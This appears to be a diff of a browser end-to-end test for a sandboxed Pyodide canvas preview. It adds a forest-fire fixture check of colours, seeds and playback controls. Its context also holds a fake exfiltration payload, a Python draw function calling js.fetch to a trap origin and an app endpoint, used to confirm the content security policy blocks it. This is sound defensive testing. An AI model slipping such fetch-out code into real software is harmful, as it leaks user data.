@@ -16,6 +16,7 @@ if(!delivery?.frameDocument)throw Error('browser-preview-frame-delivery-missing'
 const executionFrames=new Map(staticIndex.assets.filter(a=>a.kind==='frame').map(a=>[a.url,a]));
 const fixtures = new Map();
 fixtures.set('queue',await makeFixture(profiles[0])); fixtures.set('mesa',await makeFixture(profiles[1],'mesa'));fixtures.set('traffic',await makeFixture(profiles[0],'traffic'));
+fixtures.set('fire',await makeFixture(profiles[0],'fire'));
 const logs = {app:[],execution:[],trap:[],browser:[],console:[]};
 const listen = async handler => {const server=createServer(handler);await new Promise(resolve=>server.listen(0,'0.0.0.0',resolve));return server;};
 const send = (res,body,type='text/javascript',headers={}) => {res.writeHead(200,{'Content-Type':type,'Cache-Control':'no-store',...headers});res.end(body);};
@@ -73,6 +74,20 @@ try {
   await page.click('#play');const errorsBefore=logs.console.filter(entry=>entry.type==='pageerror').length;const rerun=await run({parameters:{steps:8,grid_size:15},seed:8});assert.equal(rerun.model,'traffic-python-canvas');await page.waitForTimeout(300);assert.equal(logs.console.filter(entry=>entry.type==='pageerror').length,errorsBefore);assert.equal(await page.locator('iframe.preview-python-canvas').count(),1);
   evidence.cases.push({name:'traffic-python-canvas-real-road-intersection-signal-car-pointer-playback',passed:true,packageIdentity:fixtures.get('traffic').manifest.packageIdentity});
   await page.evaluate(()=>runtime.cancel());assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);evidence.cases.push({name:'traffic-canvas-cancel-removes-opaque-frame',passed:true});
+  // Execute the exact Python draw example supplied to Pi, using real Pyodide
+  // and an opaque OffscreenCanvas, rather than a mock drawing API.
+  await load('fire');const fireInput={parameters:{steps:3,width:4,height:2,density:0.7},seed:7};
+  const fire=await run(fireInput);assert.equal(fire.model,'forest-fire-python-canvas');assert.deepEqual(await run(fireInput),fire);
+  assert.notDeepEqual(await run({...fireInput,seed:8}),fire);assert.notDeepEqual(await run({...fireInput,parameters:{...fireInput.parameters,density:0}}),fire);
+  await run(fireInput);await page.click('#step');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='1');await page.waitForTimeout(100);
+  assert.equal(await pixel(75,105),'#e5e7eb');assert.equal(await pixel(225,105),'#16a34a');assert.equal(await pixel(375,105),'#ef4444');assert.equal(await pixel(525,105),'#374151');
+  await trafficCanvas.screenshot({path:resolve(out,'fire-frame1.png')});
+  await page.click('#step');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='2');await page.waitForTimeout(100);assert.equal(await pixel(375,105),'#374151');
+  await page.click('#restart');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='0');await page.waitForTimeout(100);assert.equal(await pixel(375,105),'#16a34a');
+  await page.click('#play');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='3');await page.click('#pause');
+  assert.deepEqual(await page.evaluate(()=>trace.snapshots[3].metrics),fire.snapshots[3].metrics);
+  evidence.cases.push({name:'pi-draw-example-real-fire-four-colors-seed-parameter-playback',passed:true,packageIdentity:fixtures.get('fire').manifest.packageIdentity});
+  await page.evaluate(()=>runtime.cancel());assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);
   const trafficSource=await readFile(new URL('./fixtures/traffic.py',import.meta.url),'utf8');
   const canvasExfil=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    import js\n    js.fetch('${trapOrigin}/canvas-exfil').catch(lambda error: None)\n    js.fetch('${appOrigin}/api/canvas-exfil').catch(lambda error: None)\n    canvas.clear('#ffffff')\n`;
   fixtures.set('canvas-exfil',await makeFixture(profiles[0],'traffic',canvasExfil));await load('canvas-exfil');await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForTimeout(300);assert.equal(logs.trap.some(r=>r.url.includes('canvas-exfil')),false);assert.equal(logs.app.some(r=>r.url.includes('/api/canvas-exfil')),false);evidence.cases.push({name:'python-canvas-draw-network-denied-by-real-csp',passed:true});
